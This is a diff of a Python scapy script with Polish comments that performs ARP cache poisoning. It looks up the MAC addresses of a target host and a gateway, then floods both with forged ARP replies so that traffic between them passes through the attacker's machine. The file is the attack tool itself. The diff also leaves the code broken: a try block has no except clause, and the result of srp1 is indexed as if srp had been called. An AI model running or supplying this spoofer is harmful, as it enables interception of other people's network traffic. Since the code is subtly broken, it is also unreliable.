@@ -5,31 +5,33 @@ from scapy.all import *
 # wymagany docelowy adres IP i adres IP gatewaya
 from scapy.layers.l2 import Ether, ARP
 
+
 #
 
 
 def getMACAddress(targetip):
-    arppacket = Ether(dst='ff:ff:ff:ff:ff:ff') /ARP(op=1, pdst=targetip)
-    targetMAC = srp(arppacket, timeout=1, verbose=False)[0]
+    arppacket = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=targetip)
+    targetMAC = srp1(arppacket, timeout=5)
     return targetMAC[0][1].hwsrc
 
 
-def sendspoofedreply(targetip, targetmac, sourceip): # wysyłamy odpowiedzi ze złym source ip- spoofing
+def sendspoofedreply(targetip, targetmac, sourceip):  # wysyłamy odpowiedzi ze złym source ip- spoofing
     spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
-    send(spoofed, verbose=False)
+    send(spoofed)
+#aby zaktualizowały te urządzenia u siebie arp tables błędnymi danymi-> do source ip które będzie błedne będzie przypisany nasz mac adres
+
+def restorearp(targetip, targetmac, sourceip, sourcemac):
+    packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
+    send(packet, verbose=False)
+
 
 def main_function(targetip, gatewayip):
     targetMAC = getMACAddress(targetip)
-
     gatewayMAC = getMACAddress(gatewayip)
-
 
     # # spoofing
     try:
-        for i in range(100):
-            sendspoofedreply(targetip, targetMAC, gatewayip)
-            sendspoofedreply(gatewayip, gatewayMAC, targetip)
-    except KeyboardInterrupt:
-        print('Stop spoofing')
-    return 'Spoofing done-> \nTarget MAC: ', targetMAC, ' \n Gateway MAC: ', gatewayMAC
-    #  return 'jakiescosconiewiemczymjestalewyswietlasiewiectakbedetestowal'
+        for i in range(1,1000):
+            sendspoofedreply(targetip, targetMAC, gatewayip)  # do targetip wysyłamy pakiet z gatewayip
+            sendspoofedreply(gatewayip, gatewayMAC, targetip)  # do gatewayip wysyłamy pakiet z targetip
+    return 'Spoofing done-> Target MAC: ', targetMAC, ' Gateway MAC: ', gatewayMAC
